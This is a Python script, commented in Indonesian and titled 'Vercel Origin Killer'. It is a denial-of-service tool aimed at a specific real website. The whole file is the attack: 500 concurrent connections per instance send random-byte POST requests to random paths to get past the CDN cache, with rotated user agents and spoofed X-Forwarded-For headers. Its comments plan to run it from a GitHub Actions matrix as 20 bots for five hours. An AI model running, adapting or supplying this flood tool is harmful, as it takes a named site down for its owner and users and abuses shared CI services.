#!/usr/bin/env python3
# kill.py — 32GB RAM Maxed-Out Vercel Origin Killer
import asyncio
import aiohttp
import random
import string
import time
import sys
import os

# GANTI URL INI KALAU ADA ENDPOINT API / DB LO
TARGET = "https://www.ronajiwa.my.id"

# Tuning untuk GitHub Actions Matrix:
# 20 bot x 500 koneksi = 10,000 koneksi simultan
CONCURRENCY = 500 
DURATION = 3600 * 5 # Jalan 5 jam non-stop (sesuai limit GitHub)

def ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
    ])

def rand_path():
    # Bikin string random buat dipake jadi path (bikin 404/force origin)
    length = random.randint(5, 15)
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

async def worker(session_id, session):
    while True:
        try:
            # Tembak path random biar bypass cache Vercel
            url = f"{TARGET}/{rand_path()}?p={random.randint(1, 99999)}"
            headers = {
                "User-Agent": ua(),
                "Cache-Control": "no-cache, no-store, max-age=0",
                "Pragma": "no-cache",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "X-Forwarded-For": f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
            }
            
            # Pake POST biar server ngabisin CPU buat parsing body
            data = os.urandom(random.randint(128, 512)) # random bytes payload
            
            async with session.post(url, headers=headers, data=data, timeout=None, ssl=False) as r:
                await r.read()
                status = r.status
                cache = r.headers.get("x-vercel-cache", "NONE")
                
                # Print log kalau nembus origin atau kena error server
                if cache != "HIT" or status >= 500:
                    sys.stdout.write(f"\r[BOT-{session_id}] {status} | cache={cache} | workers={CONCURRENCY}")
                    sys.stdout.flush()
        except Exception:
            # Abaikan error (timeout/reset), langsung hajar lagi
            pass

async def main():
    # Limit=0 artinya koneksi unlimited
    conn = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=conn) as s:
        print(f"[*] LOCKING IN: {CONCURRENCY} CONCURRENCY TO {TARGET}")
        print(f"[*] DURATION: {DURATION} SECONDS ({DURATION/3600} HOURS)")
        print(f"[*] FIRE IN THE HOLE... (Ctrl+C to stop)")
        
        tasks = [asyncio.create_task(worker(i, s)) for i in range(CONCURRENCY)]
        
        try:
            await asyncio.sleep(DURATION)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
        
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        print("\n[!] Attack finished.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Aborted.")
